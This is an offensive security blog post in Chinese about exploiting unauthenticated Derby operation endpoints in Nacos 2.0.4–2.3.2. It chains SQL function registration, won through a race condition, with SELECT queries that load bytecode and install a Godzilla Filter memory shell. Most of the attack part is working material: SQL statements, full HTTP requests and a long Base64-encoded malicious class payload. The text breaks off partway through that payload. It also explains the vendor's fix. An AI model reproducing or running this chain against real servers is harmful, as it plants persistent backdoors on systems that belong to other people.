---
title: Nacos Derby SQL注入到内存马
slug: nacos-derby-sqli-to-memshell
description: 从竞争加载到无竞争字节码落地
date: 2026-11-14T23:40:24+08:00
lastmod: 2026-11-14T23:40:24+08:00
categories:
  - Offensive
tags:
  - Nacos
  - SQLi
  - Memshell
  - 条件竞争
  - JDK
---

## TL;DR

Nacos 在单机模式下默认使用内嵌的 Derby 数据库，并且在 `ConfigOpsController` 中暴露了两个未授权接口：`/v1/cs/ops/derby` 和 `/v1/cs/ops/data/removal`。前者只能执行 `SELECT` 查询，但执行过程是同步稳定的；后者可以执行任意 SQL 语句，但因为临时文件在异步线程读取前就会被删掉，所以需要 race condition 来完成利用。

网上公开的利用方式主要有两种，一种是利用 `sqlj.install_jar` 远程加载恶意 jar 包，要求目标出网；另一种不出网方案是在 `/v1/cs/ops/data/removal` 里注册 `ReflectUtils.defineClass` 自定义函数后，再通过 `INSERT INTO` 语句触发字节码加载。但 `INSERT` 属于写操作，没法在 `/v1/cs/ops/derby` 里执行，导致每次传字节码打内存马的时候也必须走 `/v1/cs/ops/data/removal` 去赌条件竞争，实测其实非常难成功。

而通过代码分析我发现，可以只在最开始把所需的 Java 静态方法注册成 Derby 自定义函数时竞争，后续真正传入字节码并初始化内存马时，直接通过 `/v1/cs/ops/derby` 的 `SELECT` 语句调用这些函数，从而实现加载字节码阶段完全不需要竞争。同时在实战中遇到的是 JDK17，针对其模块化强封装的机制导致 `ClassLoader.defineClass` 反射失效的问题，利用 Spring 5.3 中五参数的 `ReflectUtils.defineClass` 配合 `MethodHandles.privateLookupIn` 完成绕过，死而复生（DeepSeek 真是个杂种啊 骗我😧

## 代码分析

漏洞入口在 `com.alibaba.nacos.config.server.controller.ConfigOpsController`，对应的路由前缀是 `/v1/cs/ops`。

先看这个 Controller 里和 Derby 相关的两个核心方法：

```java
// config/src/main/java/com/alibaba/nacos/config/server/controller/ConfigOpsController.java
@RestController
@RequestMapping(Constants.OPS_CONTROLLER_PATH)
@ExtractorManager.Extractor(httpExtractor = ConfigDefaultHttpParamExtractor.class)
public class ConfigOpsController {

    private static final Logger LOGGER = LoggerFactory.getLogger(ConfigOpsController.class);

    private final DumpService dumpService;

    public ConfigOpsController(DumpService dumpService) {
        this.dumpService = dumpService;
    }

    @GetMapping(value = "/derby")
    @Secured(action = ActionTypes.READ, resource = "nacos/admin")
    public RestResult<Object> derbyOps(@RequestParam(value = "sql") String sql) {
        String selectSign = "SELECT";
        String limitSign = "ROWS FETCH NEXT";
        String limit = " OFFSET 0 ROWS FETCH NEXT 1000 ROWS ONLY";
        try {
            if (!DatasourceConfiguration.isEmbeddedStorage()) {
                return RestResultUtils.failed("The current storage mode is not Derby");
            }
            LocalDataSourceServiceImpl dataSourceService = (LocalDataSourceServiceImpl) DynamicDataSource
                    .getInstance().getDataSource();
            if (StringUtils.startsWithIgnoreCase(sql, selectSign)) {
                if (!StringUtils.containsIgnoreCase(sql, limitSign)) {
                    sql += limit;
                }
                JdbcTemplate template = dataSourceService.getJdbcTemplate();
                List<Map<String, Object>> result = template.queryForList(sql);
                return RestResultUtils.success(result);
            }
            return RestResultUtils.failed("Only query statements are allowed to be executed");
        } catch (Exception e) {
            return RestResultUtils.failed(e.getMessage());
        }
    }

    @PostMapping(value = "/data/removal")
    @Secured(action = ActionTypes.WRITE, resource = "nacos/admin")
    public DeferredResult<RestResult<String>> importDerby(@RequestParam(value = "file") MultipartFile multipartFile) {
        DeferredResult<RestResult<String>> response = new DeferredResult<>();
        if (!DatasourceConfiguration.isEmbeddedStorage()) {
            response.setResult(RestResultUtils.failed("Limited to embedded storage mode"));
            return response;
        }
        DatabaseOperate databaseOperate = ApplicationUtils.getBean(DatabaseOperate.class);
        WebUtils.onFileUpload(multipartFile, file -> {
            NotifyCenter.publishEvent(new DerbyImportEvent(false));
            databaseOperate.dataImport(file).whenComplete((result, ex) -> {
                NotifyCenter.publishEvent(new DerbyImportEvent(true));
                if (Objects.nonNull(ex)) {
                    response.setResult(RestResultUtils.failed(ex.getMessage()));
                    return;
                }
                response.setResult(result);
            });
        }, response);
        return response;
    }
}
```

虽然两个方法上面都挂了 `@Secured` 注解，但 Nacos 默认配置下 `nacos.core.auth.enabled=false`，鉴权切面不会生效，因此默认情况下这两个接口都可以未授权直接访问。

先看 `derbyOps` 方法，它接收 `sql` 参数后只检查了是否以 `SELECT` 开头，如果语句里不包含 `ROWS FETCH NEXT`，就在末尾拼上分页语句 `OFFSET 0 ROWS FETCH NEXT 1000 ROWS ONLY`（实战中如果在子查询或复杂语句里不希望被拼上这段分页，只要在 SQL 末尾加上 `/*ROWS FETCH NEXT*/` 或 `/*limit*/` 即可），随后直接交给 `JdbcTemplate.queryForList(sql)` 执行。因为底层走的是 `Statement.executeQuery`，Derby 会严格校验语句类型，像 `CREATE`、`INSERT`、`CALL` 这类语句都会直接报错返回 `Only query statements are allowed to be executed`，所以单靠 `/v1/cs/ops/derby` 只能做查询。

再看下面的 `importDerby` 方法，它接收上传的 `file` 文件并交给了 `WebUtils.onFileUpload`，跟进这个方法

```java
// core/src/main/java/com/alibaba/nacos/core/utils/WebUtils.java
public static void onFileUpload(MultipartFile multipartFile, Consumer<File> consumer,
        DeferredResult<RestResult<String>> response) {
    
    if (Objects.isNull(multipartFile) || multipartFile.isEmpty()) {
        response.setResult(RestResultUtils.failed("File is empty"));
        return;
    }
    File tmpFile = null;
    try {
        tmpFile = DiskUtils.createTmpFile(multipartFile.getName(), TMP_SUFFIX);
        multipartFile.transferTo(tmpFile);
        consumer.accept(tmpFile);
    } catch (Throwable ex) {
        if (!response.isSetOrExpired()) {
            response.setResult(RestResultUtils.failed(ex.getMessage()));
        }
    } finally {
        DiskUtils.deleteQuietly(tmpFile);
    }
}
```

`onFileUpload` 在 `/tmp` 目录下创建临时文件，把上传的内容写进去之后调用 `consumer.accept(tmpFile)`，也就是执行 `importDerby` 里传入的 Lambda 表达式 `databaseOperate.dataImport(file)`，然后马上在 `finally` 块里调用 `DiskUtils.deleteQuietly(tmpFile)` 把临时文件删掉。

继续跟进 `StandaloneDatabaseOperateImpl.dataImport` 和它调用的 `BaseDatabaseOperate.doDataImport`

```java
// persistence/src/main/java/com/alibaba/nacos/persistence/repository/embedded/operate/StandaloneDatabaseOperateImpl.java
@Override
public CompletableFuture<RestResult<String>> dataImport(File file) {
    return CompletableFuture.supplyAsync(() -> {
        try (DiskUtils.LineIterator iterator = DiskUtils.lineIterator(file)) {
            int batchSize = 1000;
            List<String> batchUpdate = new ArrayList<>(batchSize);
            List<CompletableFuture<Void>> futures = new ArrayList<>();
            List<Boolean> results = new CopyOnWriteArrayList<>();
            while (iterator.hasNext()) {
                String sql = iterator.next();
                if (StringUtils.isNotBlank(sql)) {
                    batchUpdate.add(sql);
                }
                if (batchUpdate.size() == batchSize || !iterator.hasNext()) {
                    List<ModifyRequest> sqls = batchUpdate.stream().map(s -> {
                        ModifyRequest request = new ModifyRequest();
                        request.setSql(s);
                        return request;
                    }).collect(Collectors.toList());
                    futures.add(CompletableFuture.runAsync(() -> results.add(doDataImport(jdbcTemplate, sqls))));
                    batchUpdate.clear();
                }
            }
            CompletableFuture.allOf(futures.toArray(new CompletableFuture[0])).join();
            int code = 500;
            if (!CollectionUtils.isEmpty(results)) {
                code = (!results.stream().anyMatch(Boolean.FALSE::equals)) ? 200 : 500;
            }
            return RestResult.<String>builder().withCode(code).withData("").build();
        } catch (Throwable ex) {
            LOGGER.error("An exception occurred when external data was imported into Derby : ", ex);
            return RestResultUtils.failed(ex.getMessage());
        }
    });
}
```

```java
// persistence/src/main/java/com/alibaba/nacos/persistence/repository/embedded/operate/BaseDatabaseOperate.java
default Boolean doDataImport(JdbcTemplate template, List<ModifyRequest> requests) {
    final String[] sql = requests.stream().map(ModifyRequest::getSql).map(DerbyUtils::insertStatementCorrection)
            .toArray(String[]::new);
    int[] affect = template.batchUpdate(sql);
    return IntStream.of(affect).count() == requests.size();
}
```

看到这里逻辑就很清楚了，`dataImport` 一上来就用 `CompletableFuture.supplyAsync` 开启异步线程去按行读取 `file`，再通过 `template.batchUpdate(sql)` 批量执行文件里的每一行 SQL，没有任何语句类型的限制。但因为 `supplyAsync` 是异步的，`consumer.accept(tmpFile)` 把任务提交给线程池后会立刻返回，紧接着主线程就会走进 `onFileUpload` 的 `finally` 块把临时文件删掉。

所以只有通过多线程高并发发包，让异步线程在主线程执行 `deleteQuietly` 之前把文件句柄打开，文件里的 SQL 才能真正被执行。

另外顺带看一眼 Nacos 2.4.0 的修复方式。2.4.0 在 `derbyOps` 和 `importDerby` 开头都加上了 `ConfigCommonConfig.getInstance().isDerbyOpsEnabled()` 的判断，这个开关默认是 `false`，也就是关闭接口，请求这两处接口会直接返回 `Derby ops is disabled, please set nacos.config.derby.ops.enabled=true to enabled this feature.`，所以漏洞影响范围为 Nacos 2.0.4 到 2.3.2。

## 字节码加载与 JDK8 利用

Derby 支持将 Java 类中的 static 方法注册为数据库里的函数或存储过程，在目标不出网的情况下，不能用 `sqlj.install_jar` 去远程拉取 jar 包，只能想办法在 SQL 里直接完成 Base64 解码和字节码加载 :( 实际需要出网的洞我可能看都不会看一眼🤣

网上公开的不出网加载字节码方案是这样写的

```sql
CREATE TYPE pbqmhhjClass EXTERNAL NAME 'java.lang.Class' LANGUAGE JAVA;
CREATE TYPE pbqmhhjObject EXTERNAL NAME 'java.lang.Object' LANGUAGE JAVA;
CREATE TYPE pbqmhhjClassLoader EXTERNAL NAME 'java.lang.ClassLoader' LANGUAGE JAVA;

CREATE FUNCTION base64Decode(className VARCHAR(32672))
  RETURNS VARCHAR(32672) FOR BIT DATA
  EXTERNAL NAME 'org.springframework.util.Base64Utils.decodeFromString'
  LANGUAGE JAVA PARAMETER STYLE JAVA;

CREATE FUNCTION getSystemCL()
  RETURNS pbqmhhjClassLoader
  EXTERNAL NAME 'java.lang.ClassLoader.getSystemClassLoader'
  LANGUAGE JAVA PARAMETER STYLE JAVA;

CREATE FUNCTION defineEvil(className VARCHAR(32672), bytes VARCHAR(32672) FOR BIT DATA, loader pbqmhhjClassLoader)
  RETURNS pbqmhhjClass
  EXTERNAL NAME 'org.springframework.cglib.core.ReflectUtils.defineClass(java.lang.String, byte[], java.lang.ClassLoader)'
  LANGUAGE JAVA PARAMETER STYLE JAVA;

CREATE TABLE mytrigger(v pbqmhhjClass);

INSERT INTO mytrigger VALUES (
  defineEvil('Evil', base64Decode('yv66...'), getSystemCL())
);
```

这套公开写法在实际使用中有两个很明显的问题

第一，它最后是用 `INSERT INTO mytrigger VALUES (defineEvil(...))` 来触发函数调用的。前面分析过，`/v1/cs/ops/derby` 只放行 `SELECT` 语句，`INSERT` 语句放不进去，所以公开方案在真正加载恶意字节码的时候，依然只能把这十几 KB 的 Base64 字节码塞进 `/v1/cs/ops/data/removal` 去跑条件竞争。不仅每次换 payload 都要重新竞争，而且一旦同一轮并发里有多个线程同时抢赢，同一个类名被 `defineClass` 重复定义还会直接抛 `LinkageError`，实测非常难成功。

第二，公开方案里用 `ClassLoader.getSystemClassLoader()` 获取的是 `AppClassLoader`。在 Spring Boot 打包出来的 `nacos-server.jar`（fat jar）结构下，Tomcat 相关的类（比如 `Filter`、`ServletRequest`）都在 `BOOT-INF/lib/` 下，由 `LaunchedURLClassLoader` 或 Web 容器的 `TomcatEmbeddedWebappClassLoader` 负责加载。如果把 Tomcat Filter 内存马直接定义到 `AppClassLoader` 里，由于双亲委派机制下父加载器看不到子加载器的类，初始化内存马时很容易因为找不到 Servlet API 的类而失败。

怎么把加载字节码这一步从“需要竞争”变成“不需要竞争”？

其实思路很简单，前面我们说了有一个接口是能够稳定查询的，既然 `ReflectUtils.defineClass` 和 `Class.forName` 都有返回值，只要注册成 Derby 的 FUNCTION，那么我们在 `SELECT` 语句里调用这些函数，就能直接走同步的 `/v1/cs/ops/derby` 接口，完全绕开条件竞争这条我没成功过的路。

这里需要注意一个细节，如果直接写 `select F(...) from config_info`，当目标 Nacos 是新部署的空实例、`config_info` 表里没有任何配置数据时，查询结果是 0 行，Derby 根本不会去计算列里的函数 `F(...)`。要让空表也强制执行一次函数，只需要在查询列前面加一个聚合函数 `count(*)`，写成 `select count(*) as b, F(...) as a from config_info`。因为 `count(*)` 一定会返回一行统计结果，Derby 在构造这一行结果时就会老老实实把后面的 `F(...)` 执行一遍。

同时，为了在 JDK8 下把内存马直接注入到当前 Web 应用的 ClassLoader 中，我们把获取类加载器的函数换成 `org.springframework.util.ClassUtils.getDefaultClassLoader()`，它会直接取当前 HTTP 请求线程的上下文类加载器（即 `TomcatEmbeddedWebappClassLoader`）。

整理下来，JDK8 环境下先通过 `/v1/cs/ops/data/removal` 并发竞争执行一次函数注册

```sql
create type C external name 'java.lang.Class' language java
create type L external name 'java.lang.ClassLoader' language java
create function D(s varchar(32672)) returns varchar(32672) for bit data external name 'org.springframework.util.Base64Utils.decodeFromString' language java parameter style java
create function K() returns L external name 'org.springframework.util.ClassUtils.getDefaultClassLoader' language java parameter style java
create function F(a varchar(32672), b varchar(32672) for bit data, x L) returns C external name 'org.springframework.cglib.core.ReflectUtils.defineClass(java.lang.String,byte[],java.lang.ClassLoader)' language java parameter style java
create function N(a varchar(32672), b boolean, x L) returns C external name 'java.lang.Class.forName(java.lang.String,boolean,java.lang.ClassLoader)' language java parameter style java
```

只要这几条固定声明竞争成功（可以通过查询 `SYS.SYSALIASES` 表确认函数是否创建成功），后续加载字节码和触发类初始化就完全不需要再竞争了，直接向 `/v1/cs/ops/derby` 发送两个 GET 请求即可。执行的 SQL 语句原型如下：

```sql
select count(*) as b, F('类名', D('字节码'), K()) as a from config_info /*limit*/

select count(*) as b, N('类名', true, K()) as a from config_info /*limit*/
```

第一条 SQL 调用 `ReflectUtils.defineClass` 把解码后的字节码定义到当前线程的 `ClassLoader` 中，第二条 SQL 调用 `Class.forName(name, true, loader)` 确保类的 `static {}` 静态代码块被执行，从而完成哥斯拉 Filter 内存马的注册。

```http
POST /nacos/v1/cs/ops/data/removal HTTP/1.1
Host: 127.0.0.1:8848
Sec-Fetch-Mode: navigate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cache-Control: max-age=0
Sec-Fetch-Site: same-origin
sec-ch-ua-mobile: ?0
If-Modified-Since: Wed, 03 Apr 2024 06:25:07 GMT
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
Sec-Fetch-Dest: document
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Upgrade-Insecure-Requests: 1
sec-ch-ua-platform: "macOS"
Sec-Fetch-User: ?1
Cookie: lang=zh-CN; flavor_uv=1; grafana_session=0819560c9c23861c1372c45faded2e95; XSRF-TOKEN=60076405-84b6-42e3-b669-aaada2d50fc8; JSESSIONID=A346858F7C26752E1DC85C37A3276B40; java-chains-token-key=admin_token
sec-ch-ua: "Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydGQWXb3jKyayCIGQ
Content-Length: 141{{repeat(88)}}

------WebKitFormBoundarydGQWXb3jKyayCIGQ
Content-Disposition: form-data; name="file"; filename="x.sql"

create type C external name 'java.lang.Class' language java
create type L external name 'java.lang.ClassLoader' language java
create function D(s varchar(32672)) returns varchar(32672) for bit data external name 'org.springframework.util.Base64Utils.decodeFromString' language java parameter style java
create function K() returns L external name 'org.springframework.util.ClassUtils.getDefaultClassLoader' language java parameter style java
create function F(a varchar(32672), b varchar(32672) for bit data, x L) returns C external name 'org.springframework.cglib.core.ReflectUtils.defineClass(java.lang.String,byte[],java.lang.ClassLoader)' language java parameter style java
create function N(a varchar(32672), b boolean, x L) returns C external name 'java.lang.Class.forName(java.lang.String,boolean,java.lang.ClassLoader)' language java parameter style java
------WebKitFormBoundarydGQWXb3jKyayCIGQ--
```

![](assets/001.png)

```http
GET /nacos/v1/cs/ops/derby?sql=select+count%28%2A%29+as+b%2C+F%28%27org.springframework.boot.loader.FileSerializerfa4738ba997949f4893f7031f900437d%27%2C+D%28%27yv66vgAAADIBtAEATm9yZy9zcHJpbmdmcmFtZXdvcmsvYm9vdC9sb2FkZXIvRmlsZVNlcmlhbGl6ZXJmYTQ3MzhiYTk5Nzk0OWY0ODkzZjcwMzFmOTAwNDM3ZAcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAANtc2cBABJMamF2YS9sYW5nL1N0cmluZzsBAAJvawEAAVoBAA1nZXRVcmxQYXR0ZXJuAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAIvKggACwEADGdldENsYXNzTmFtZQEALW9yZy5hcGFjaGUuaHR0cC53ZWIuaGFuZGxlcnMuTE1IS0kuQXV0aEZpbHRlcggADgEAD2dldEJhc2U2NFN0cmluZwELnEg0c0lBQUFBQUFBQUFLVlhlWHdUeHhYK3hwSzlzaXdIRUtjQ0JOb1VrQzJNOElreEpNVVdUbkd3RFkwcHJuR3Z0YnkyQkVKU2RsZlk3cDNlOTMzUjByc3BiZFBET0sxc1FrTG9sYlJKYVpvbXZkTTd0T2w5NTQvOCtzUDlabmNsUzdKSS9xakJHcjE1NzgxODc4MzMzb3p2dTN6SGVRQk5lRnlnSWFXUGg5VzBHbzFwNFpocHBzTVQya2c0cGlaSEU1cHVoSHY3OXUzdkNYZG16TmdOOFlTcDZRcUV3TXFqNmdrMW5GQ1Q0K0ZJUWpXTTNwUTZLbFV1Z1JWU05SazJOUDFFUWpQRE9hZEtBZGN4YlVyQTM3dmdPMkRxOGVUNExvR2x6ZEUyYmZ0SXU3b3oydGphMU5TaWVsQXQ0RTV6YVE5cTZIcDh0RlZnWTJOalpHOWJaL3VPMXZhZDdTMk5iYzF0a2VZZG5aSDJwcmJPcHM3dExWMFJENjRTOE1ZMENhWmZQYTRKVkhWR28xcmE5R0NaUUkydE9Ld21NdFJVbS9KblQyTlRzd2NyQkpTME9wVmdGQUxMZWt1Q0k3NFZwWE83NjYvbmROWHVlREp1WGs5OHdickRQZ1J3dFJkdXJCVzRPbGpxWUdkb2wyMjJYcHBkSStBWlRkbjVFUmkyUFJZU04yQ1BOMmszWnpURDNIVWxyWkZPSlEydFZHMnZHb21wOFNTM0ZMaW1ySGYzcE14TlBKVlU4SFNCNVJiaWVDcmNjNkJBOFl5Y3dncmxVRXhQVGFnakNVM0Jab0ZOeGF0YTNObkhqMkxvQ29JQ201L0sxSTVEUWIwUFMrR3BSZ1cyOG96R05YT2ZkV2hjSWJpWU9IV0xwM3pZaG5BTjZyRGRoK1gyUWsza1Y2bWRnaGFtUDVwS21reVJJYkMyNk1CaXFqNGd3U2VqMnE2Nkl6NjBZWWNYcldpM0VRM3FjZXZJVmdlZC9abXpnMXpVVVJCQ0IzYlZJSVRkUHRUWUVFZ1JIejBQcWpwWlNSc2Y5dGdvTzZrWVVRMnRyV1d2RmsyTmtwZXJ5c1U1M09WREJIdTlYS3BiUUV5U3I4SGhyaVBXL0xPd1Q4NzMrTEFLcStWbSs0dmk1WkV4Z3dyNkJHcWpHVjNYa3FZOVJWWUhDeE5venhMOUFSejBvaC9QWnBrVGM0UTUwaWJOQWhJTEJJb2NDL250d3dBT1NlL25TRXlrdUpETEVPc2lCNW8rRjBQUzZvakF1aWZqdm9MbkNheC9VdjRyZUFGUlhiRUdGTHlvZ044Rlo2VmdSS0JpdUV2QnFMT0ZOT2lhTXJWT1hWZW5EbVRNZE1ia0lXanFjUVZqWG96TDRsNVNFb21DT0p0TFVwdm9TUnFtU3M2VVp2YkF5RkV0YWpMZ1kwaDRjUlRIaXc3STFpcElzWjh3WURWaHlJd3RkcGRFdkJtNkYyblF3bU9tYkhLVWJwYXZnd3hPU05zSkgycHRFckw1Vmh1WkVjTnhXeFhzNlNucitCSzhWTEw5WlFLVkV6SkxKWEJ5bkdRbmV3VmU2VVVVdHpCOE01WFBHaHQzMEdMbXEvRWFtYkxYNWpuZW5jeHh2SmdRK2ExZmp6ZElScnhSYm5rbGNHK1c0TjVDY0dPSmpCSHo0VzJ5NjBieGRzNUVFeWxEOCtHZDlzeTdlRlFrY0xldXAvUSt6VERVY1c1ZEYrd3QwODdLZDVMMzRMMFN6ZnNFOXZ4LzNWbm1haU0rVUFNVko0djZhVUdqL1pCRGltMFpNNTdZMW1YbHk0TVBzOUxIVXM1bHR1a3BXbUN1cmo2S2owbWFmWngzb1l6ZlNycnV3U2Q1K1E0dk1sZHdxOTNXK2pRemxock54MXEweTJLM3duMTFiU3hCaG9idEZRamdORDRqQVh5V3NRNHZKcktDMndUV1hNbGR3UmRZQ1BIa2lkUXhocnl6VENHVVdiSnN0WDBKMDE1OEVXZFlMTEtQU2RnRXRMaDEwZlIyZkZuV3lsY0VydEtzZEIxeXFzdURXZExWeUNTM0hZOGIwVzFkblFQZE9Sb3pvMmRseVZxQ0IrZnNiTnR0bkxxN3FCdlZiTjNkaTlmSTIzMlYxV0hiZFdYR3h1VE0xNW1kY2gzVGZuUFVqR3BqOGFUbWhMT2Foc1ZsbkF2cEh0d3JYeG5mNHVPa3MzdkFnL3NjNGsyR28vcFUya3lGSS9GMFRIYkE3M0JOQWw5b1huVlhwRm1KTDNmNUxoN3c0aUsrSjdDaHlNQklhMUdXUVZUWHpQM2ExQUFsQmQvM1FiRTcwY1Aya2NpT1lmandROWttV3ZFak81cnluU2FBbjNqeEVIN0szaUtmWE5LMHg3WTBOTjVxY1hNcXpIMHMwMGZ3Y3ducEY2d2MrYnhLcWdtZWhNeW5iRW0vd3ErbDhqZWwxMEd1eHo4cUw3ZjhyVjdZL3gwWXYvUGlFbjdQenBLMjNkVG9zVU82S3RPMlpzR3ZZRW5MN1EvNG94ZGI4Q2ZaRFNma0FteE5HMHBiaW5OZnBaSmo4WEhyMGFhTXNyWG9LZmJUV3M3SzB6RnpiOWVCK0hoU05UTTZ2N3NqVmt1dHRhRDBxZWxEc3ArUmkvbldZdUJwVExrYnpBTC9lZVVaOFBzLytQcXZvT1NWVDVTODdLTmNXeUF2b2J5MFFQWlRYbDRncjZUTVZ3ZmxmMXJ5R3NwQ3ZvUDUrUy9PTE9Nb09GYld6MkxkR2NnZnFWN3ZxUDEwcWVCWVZSK2F4WWFjZnFNRm1IclJROWhlemowZXVvQzZEdmZXQ3doMVZBYmNNMmc0aThZS1V2eUJCV0VHelZuc1BJazdBNVZuY1oxQVI1WFVQZk1zdWlvd2h4czZsUHFBNHNyaXhnNWxCcjMzWXUwNVZBek40YVlzRHM5aU1LQmtNWHc3ZWs4amZnN2pRN09JZFhob2xrV3lvenBRSGZCa1lRNXlkRHVqWW85WlRBNEdxbWJ3WXRmU3BWbThQSXRYQmFycXBmSHJhSGpqSE41a3pWQXYxVysxaEN6ZUlUL2VmUnJMTzVTQU1pZ2RsRm04bjhvenArRWg2S3JCaHREV3MvaWdDMmVZaFZZOGlJZEpIUjhleFdNY0JmN05mRFJDbWVkandxT2dRc0h6RmJ4UWdhcWdUa0ZJQVF0TkE1NkF4a2ZObGlWUEFISjA0ejh5elZ6d1dteEN0YnhuN1JUalZzNVdjalJFci84amMvaEUzMWIvcDhRRmZEcUx6MjNsK1Brc1p2b2Jzc2o2NTl4MzRlaVF5NjhOVU5WQUlUM2txdWYzbVF0b1pkNWErdjEzV080eVoyNlpxYXovemtLWGdMdkVKelROYUNwd0haL0NwNXk0MXFCaW5pS0Q0b3V1RlVMQnFmOWl1OEtyUk1LWEZENUY4SHdJTytCdmM4QlBMWUEvWHhiOEJRZEo2Mkx3R3Y4VC80NSsvOWRLOFgrajBLc0V2K1htaExDSGtJcENpTWdRV3VWQjJDRTBGNGNnNU12WENXRWw1MlFKVk5lSFhLSHpzL2oydEZVRmRqbDlrNlo4M2p2VmNndWpkWE1NK2UrZnc0UDlEZXRPUW5HZmhydnlIQjRhbXNFUHN2aXgvLzVaL0N5TFh6YUVzdmp0ZEwrWXRxcHZDNEo1Zkx2aG1tZFp1eTNxYUlSM1VXSzhPQy9CRmN6eHkwVXh6OHAyT1pOV0pJVEVOMUVlam91QWdEYlI1OVJNL3psY0dtcVl4V045SWFieHo4ejhYMWkwOTBDaDlOZUFlN3FqTWk5VTNtMlYvalg4RXdqOERWbWpqYkFPcnN2WXJPQ1NBdjZaMWpwUE14dkVGczVKR0ZzdWt3UnNZN0lhSHNIZm5FVFdXaG5qSW5ZYnlXWDdXdjcrUGQrUGFxMWQ4a2I0SDJFczcyVUhFUUFBCAARAQAGPGluaXQ%2BAQADKClWAQATamF2YS9sYW5nL1Rocm93YWJsZQcAFQwAEwAUCgAEABcMAAcACAkAAgAZAQAKZ2V0Q29udGV4dAEAESgpTGphdmEvdXRpbC9TZXQ7DAAbABwKAAIAHQEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyBwAfCgAgABcMAAUABgkAAgAiAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7DAAkACUKACAAJgEAD2NvbnRleHQgZXJyb3I6IAgAKAEAD2dldEVycm9yTWVzc2FnZQEAKShMamF2YS9sYW5nL1Rocm93YWJsZTspTGphdmEvbGFuZy9TdHJpbmc7DAAqACsKAAIALAEACHRvU3RyaW5nDAAuAAoKACAALwEADWphdmEvdXRpbC9TZXQHADEBAAdpc0VtcHR5AQADKClaDAAzADQLADIANQEAEWNvbnRleHQgbm90IGZvdW5kCAA3AQAIaXRlcmF0b3IBABYoKUxqYXZhL3V0aWwvSXRlcmF0b3I7DAA5ADoLADIAOwEAEmphdmEvdXRpbC9JdGVyYXRvcgcAPQEAB2hhc05leHQMAD8ANAsAPgBAAQAEbmV4dAEAFCgpTGphdmEvbGFuZy9PYmplY3Q7DABCAEMLAD4ARAEACmNvbnRleHQ6IFsIAEYBAA5nZXRDb250ZXh0Um9vdAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9TdHJpbmc7DABIAEkKAAIASgEAAl0gCABMAQAIZ2V0U2hlbGwBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwATgBPCgACAFABAAZpbmplY3QBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYMAFIAUwoAAgBUAQABWwgAVgwACQAKCgACAFgBAAhdIHJlYWR5CggAWgEAB2ZhaWxlZCAIAFwBAAEKCABeAQAQamF2YS9sYW5nL1N5c3RlbQcAYAEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwwAYgBjCQBhAGQBACUoKUxqYXZhL3V0aWwvU2V0PExqYXZhL2xhbmcvT2JqZWN0Oz47AQATamF2YS9sYW5nL0V4Y2VwdGlvbgcAZwEAEWphdmEvdXRpbC9IYXNoU2V0BwBpCgBqABcBABBqYXZhL2xhbmcvVGhyZWFkBwBsAQARZ2V0QWxsU3RhY2tUcmFjZXMBABEoKUxqYXZhL3V0aWwvTWFwOwwAbgBvCgBtAHABAA1qYXZhL3V0aWwvTWFwBwByAQAGa2V5U2V0DAB0ABwLAHMAdQEAB2dldE5hbWUMAHcACgoAbQB4AQAcQ29udGFpbmVyQmFja2dyb3VuZFByb2Nlc3NvcggAegEAEGphdmEvbGFuZy9TdHJpbmcHAHwBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgwAfgB%2FCgB9AIABAAZ0YXJnZXQIAIIBAA1nZXRGaWVsZFZhbHVlAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsMAIQAhQoAAgCGAQAGdGhpcyQwCACIAQAIY2hpbGRyZW4IAIoBAAZ2YWx1ZXMBABgoKUxqYXZhL3V0aWwvQ29sbGVjdGlvbjsMAIwAjQsAcwCOAQAUamF2YS91dGlsL0NvbGxlY3Rpb24HAJALAJEAOwEABmFkZEFsbAEAGShMamF2YS91dGlsL0NvbGxlY3Rpb247KVoMAJMAlAsAMgCVAQAGUG9sbGVyCACXAQADYWpwCACZAQAHaGFuZGxlcggAmwEABXByb3RvCACdAQAHYWRhcHRlcggAnwEACWNvbm5lY3RvcggAoQEAB3NlcnZpY2UIAKMBAAZlbmdpbmUIAKUBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7DACnAKgKAG0AqQEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwAqwCsCgAEAK0BAA9qYXZhL2xhbmcvQ2xhc3MHAK8BAA1nZXRTaW1wbGVOYW1lDACxAAoKALAAsgEAEy4rV2ViYXBwQ2xhc3NMb2FkZXIIALQBAAdtYXRjaGVzAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaDAC2ALcKAH0AuAEACXJlc291cmNlcwgAugoAsAB4AQAEUm9vdAgAvQEACGVuZHNXaXRoDAC%2FALcKAH0AwAEAB2NvbnRleHQIAMIBAANhZGQBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoMAMQAxQsAMgDGAQARZ2V0U2VydmxldENvbnRleHQIAMgBAAxpbnZva2VNZXRob2QBAF0oTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAMoAywoAAgDMAQAOZ2V0Q29udGV4dFBhdGgIAM4KAH0ANQEAAygvKQgA0QEAASgIANMBAAEpCADVAQAUZ2V0V2